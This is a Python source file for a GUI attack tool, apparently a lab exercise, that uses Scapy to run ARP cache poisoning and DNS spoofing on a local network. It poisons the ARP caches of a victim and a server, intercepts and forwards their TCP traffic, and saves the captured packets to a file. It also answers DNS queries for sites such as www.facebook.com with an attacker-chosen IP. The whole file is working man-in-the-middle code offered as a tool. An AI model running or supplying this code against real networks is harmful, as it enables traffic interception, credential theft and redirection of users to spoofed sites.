from scapy.all import *
from scapy.layers.inet import IP
from scapy.layers.inet import TCP
from Tkinter import *
import threading
import time

class Application(Frame):
    def __init__(self, master=None):
        Frame.__init__(self, master)
        self.master=master
        self.grid()
        self.createWidgets()
        self.interceptedPackets = []
        self.NETWORK_INTERFACE = "enp0s3" #hardcoded
        print("(GENERAL) Network Interface: " + self.NETWORK_INTERFACE);
        self.ATTACKER_MAC = get_if_hwaddr(self.NETWORK_INTERFACE)
        print("(GENERAL) Attacker MAC: " + self.ATTACKER_MAC);

        
    def createWidgets(self):        
        self.arp = Button(self, text="ARP Poisoning", command=self.on_click_arp) #, state="disabled"
        self.arp.grid(row=0, column=0)
        
        self.dns = Button(self, text="DNS Spoofing", command=self.on_click_dns) #, state="disabled"
        self.dns.grid(row=0, column=4)

        self.grid_columnconfigure(2, minsize=100)


        self.quit = Button(self, text="QUIT", fg="red", command=self.on_quit)
        self.quit.grid(row=13, column=2)
        
        Label(self, text="IP Victim").grid(row=2)
        Label(self, text="IP Server").grid(row=5)
        
        #self.fieldMACVictim = Entry(self)
        self.fieldIPVictimARP = Entry(self)
        self.fieldIPVictimARP.insert(END, "192.168.56.101");
        #self.fieldMACToSpoof = Entry(self)
        self.fieldIPServer = Entry(self)
        self.fieldIPServer.insert(END, "192.168.56.102");

        self.fieldIPVictimARP.bind("<Key>", self.click)
        self.fieldIPServer.bind("<Key>", self.click)

        self.fieldIPVictimARP.grid(row=3)
        self.fieldIPServer.grid(row=6)


        Label(self, text="IP Victim").grid(row=2, column=4)
        Label(self, text="Website to Spoof").grid(row=5, column=4)
        Label(self, text="IPs to redirect to").grid(row=8, column=4)
        Label(self, text="DNS Server").grid(row=11, column=4)

        self.fieldIPVictimDNS = Entry(self)
        self.fieldIPVictimDNS.insert(END, "192.168.56.101");

        self.fieldWebsite = Entry(self)
        self.fieldWebsite.insert(END, "www.facebook.com,www.twitter.com");

        self.fieldRedirectIP = Entry(self)
        self.fieldRedirectIP.insert(END, "192.168.56.102")
        
        self.fieldDNSServer = Entry(self)
        self.fieldDNSServer.insert(END, "192.168.56.1");

        self.fieldIPVictimDNS.bind("<Key>", self.click)
        self.fieldWebsite.bind("<Key>", self.click)
        self.fieldRedirectIP.bind("<Key>", self.click)
        self.fieldDNSServer.bind("<Key>", self.click)

        self.fieldIPVictimDNS.grid(row=3, column=4)
        self.fieldWebsite.grid(row=6, column=4)
        self.fieldRedirectIP.grid(row=9,column=4)
        self.fieldDNSServer.grid(row=12, column=4)

        


    
    #When the attack starts)
    def on_click_arp(self):

    	self.VICTIM_IP = self.fieldIPVictimARP.get().split(",")
        self.VICTIM_MAC = []
        for i in range(0,len(self.VICTIM_IP)):
            self.VICTIM_MAC.append(self.get_mac(self.VICTIM_IP[i]))

        print("(ARP) Victim IP: " + str(self.VICTIM_IP) + ", Victim MAC: " + str(self.VICTIM_MAC));
        
        self.SERVER_IP = self.fieldIPServer.get().split(",")
        self.SERVER_MAC = []
        for i in range(0,len(self.SERVER_IP)):
            self.SERVER_MAC.append(self.get_mac(self.SERVER_IP[i]))

        print("(ARP) Server IP: " + str(self.SERVER_IP) + ", Server MAC: " + str(self.SERVER_MAC));

        #ARP poison thread
        poison_thread = threading.Thread(target=self.arp_poisoning) #, args=(IPToSpoof, MACToSpoof, IPVictim, MACVictim)
        poison_thread.daemon=True #The Thread dies when the main thread dies
        poison_thread.start()

        sniff_thread_victim = threading.Thread(target=self.arp_sniffing_victim)
        sniff_thread_victim.daemon=True
        sniff_thread_victim.start()     
     
     
    def arp_poisoning(self):
        #Poison the Windows Machine
        while True:
            for i in range(0,len(self.VICTIM_IP)):
                for j in range(0,len(self.SERVER_IP)):
                    if (self.VICTIM_IP[i]!=self.SERVER_IP[j]):
                        arp= Ether() / ARP()
                        arp[Ether].src = self.ATTACKER_MAC
                        arp[ARP].hwsrc = self.ATTACKER_MAC
                        arp[ARP].psrc = self.SERVER_IP[j]
                        arp[ARP].hwdst = self.VICTIM_MAC[i]
                        arp[ARP].pdst = self.VICTIM_IP[i]

                        sendp(arp, iface=self.NETWORK_INTERFACE)

                        #Poison the Linux Webserver
                        arp= Ether() / ARP()
                        arp[Ether].src = self.ATTACKER_MAC
                        arp[ARP].hwsrc = self.ATTACKER_MAC
                        arp[ARP].psrc = self.VICTIM_IP[i]
                        arp[ARP].hwdst = self.SERVER_MAC[j]
                        arp[ARP].pdst = self.SERVER_IP[j]

                        sendp(arp, iface=self.NETWORK_INTERFACE)

            poisonedIPs = [self.VICTIM_IP, self.SERVER_IP]
            print("(ARP) Re-poisoned the ARP of the following IPs: " + str(poisonedIPs));
            time.sleep(14)
    
    #Filters out TCP packets that were meant for a poisoned target
    def sniff_filter(self, pkt):
        #Obtain TCP packets meant for the server, but that were sent to us instead.
        if pkt.haslayer(TCP) and ((pkt[IP].dst in self.SERVER_IP or pkt[IP].dst in self.VICTIM_IP) and pkt[Ether].dst == self.ATTACKER_MAC):
            return True
        else:
            return False    
        
        
    #forward packets meant for a poisoned target
    def arp_sniffing_victim(self):
        
        print("(ARP) Forwarding the TCP packets");

        def intercept_packet(packet):
            
            self.interceptedPackets.append(packet)
            if packet[IP].dst in self.SERVER_IP:
                index = self.SERVER_IP.index(packet[IP].dst)
                print("(ARP) Forwarding packet to server..")
                packet[Ether].dst = self.SERVER_MAC[index]
            else:
                print("(ARP) Forwarding packet to victim..")
                index = self.VICTIM_IP.index(packet[IP].dst)
                packet[Ether].dst = self.VICTIM_MAC[index]
            packet[Ether].src = self.ATTACKER_MAC
            sendp(packet, iface=self.NETWORK_INTERFACE)

        sniff(lfilter=self.sniff_filter, prn=intercept_packet, iface=self.NETWORK_INTERFACE)
            

        print("(ARP) Finished forwarding Packets!");

    
    #Get the MAC Address for a given IP address (by sending an ARP-request)
    def get_mac(self, IP):
        conf.verb = 0
        ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = 2, iface = self.NETWORK_INTERFACE, inter = 0.1)
        for snd, rcv in ans:
            return rcv.sprintf(r"%Ether.src%")


    def click(self, key):
        self.arp['state']="normal"

    def on_quit(self):
        print "(GENERAL) Storing intercepted packets (if ARP-poisoning was performed)..."
        if len(self.interceptedPackets) > 0:
            wrpcap("loggedPackets.cap",self.interceptedPackets)
        print "(GENERAL) Intercepted packets stored!"
        root.destroy()
        
    def dns_spoof(self, WEBSITE, DNS_SERVER):

        #REDIRECT_SERVER_IP = "192.168.56.102"  # Your local IP
    
        BPF_FILTER = "udp port 53 and ip dst "+ DNS_SERVER[0]
        #192.168.56.1"

        #WEBSITE = "www.facebook.com"

        def dns_responder():
 
            def forward_dns(orig_pkt):
                print("(DNS) Forwarding: " + orig_pkt[DNSQR].qname)
                response = sr1(
                    IP(dst='8.8.8.8')/
                        UDP(sport=orig_pkt[UDP].sport)/
                        DNS(rd=1, id=orig_pkt[DNS].id, qd=DNSQR(qname=orig_pkt[DNSQR].qname)),
                    verbose=0,
                )
                resp_pkt = IP(dst=orig_pkt[IP].src, src=DNS_SERVER[0])/UDP(dport=orig_pkt[UDP].sport)/DNS()
                resp_pkt[DNS] = response[DNS]
                send(resp_pkt, verbose=0)
                return "[DNS] Responding to "+orig_pkt[IP].src
         
            def get_response(pkt):
                if (
                    DNS in pkt and
                    pkt[DNS].opcode == 0 and
                    pkt[DNS].ancount == 0
                ):                
                    for i in range(0,len(WEBSITE)):
                        SITE = WEBSITE[i]
                        if SITE in str(pkt["DNS Question Record"].qname):
                            redirectIP = self.REDIRECT_TO_IP[i] if len(self.REDIRECT_TO_IP) < i else self.REDIRECT_TO_IP[0]
                        
                            spf_resp = IP(dst=pkt[IP].src)/UDP(dport=pkt[UDP].sport, sport=53)/DNS(id=pkt[DNS].id,ancount=1,an=DNSRR(rrname=pkt[DNSQR].qname, rdata=redirectIP)/DNSRR(rrname=SITE,rdata=redirectIP))
                            send(spf_resp, verbose=0, iface=self.NETWORK_INTERFACE)
                            return "[DNS] Spoofed DNS Response Sent - Redirected " + SITE + " to "+ redirectIP + " (for client "+ pkt[IP].src +")"

                    # make DNS query, capturing the answer and send the answer
                    return forward_dns(pkt)
         
            return get_response
         
        sniff(filter=BPF_FILTER, prn=dns_responder(), iface=self.NETWORK_INTERFACE)

    def on_click_dns(self):

        self.VICTIM_IP = self.fieldIPVictimDNS.get().split(",")
        self.VICTIM_MAC = []
        for i in range(0,len(self.VICTIM_IP)):
            self.VICTIM_MAC.append(self.get_mac(self.VICTIM_IP[i]))

        self.WEBSITE = self.fieldWebsite.get().split(",")
        self.REDIRECT_TO_IP = self.fieldRedirectIP.get().split(",")
        self.DNS_SERVER_IP = self.fieldDNSServer.get().split(",")

        print("(DNS) Starting the ARP-poison thread to make the following IPs think we (" + self.ATTACKER_MAC + ") are their local NS: " + str(self.VICTIM_IP))
        rearp_thread = threading.Thread(target=self.rearp_poisoning)
        rearp_thread.daemon=True
        rearp_thread.start()
        
        #DNS spoof thread
        print "(DNS) Starting DNS thread that forwards or spoofs DNS requests"
        dns_thread = threading.Thread(target=self.dns_spoof, args=(self.WEBSITE, self.DNS_SERVER_IP))
        dns_thread.daemon=True #The Thread dies when the main thread dies
        dns_thread.start()

    def rearp_poisoning(self):
        while True:
            print "(DNS) Poisoning the ARP Cache of "+ str(self.VICTIM_IP) + " with " + str(self.DNS_SERVER_IP) + " as DNS server"
            for i in range(0,len(self.VICTIM_IP)):
                for j in range(0,len(self.DNS_SERVER_IP)):
                    arp= Ether() / ARP()
                    arp[Ether].src = self.ATTACKER_MAC
                    arp[ARP].hwsrc = self.ATTACKER_MAC
                    arp[ARP].psrc = self.DNS_SERVER_IP[j]
                    arp[ARP].hwdst = self.VICTIM_MAC[i]
                    arp[ARP].pdst = self.VICTIM_IP[i]

                    sendp(arp, iface=self.NETWORK_INTERFACE)
            time.sleep(14)

root = Tk()

app = Application(master=root)
app.mainloop()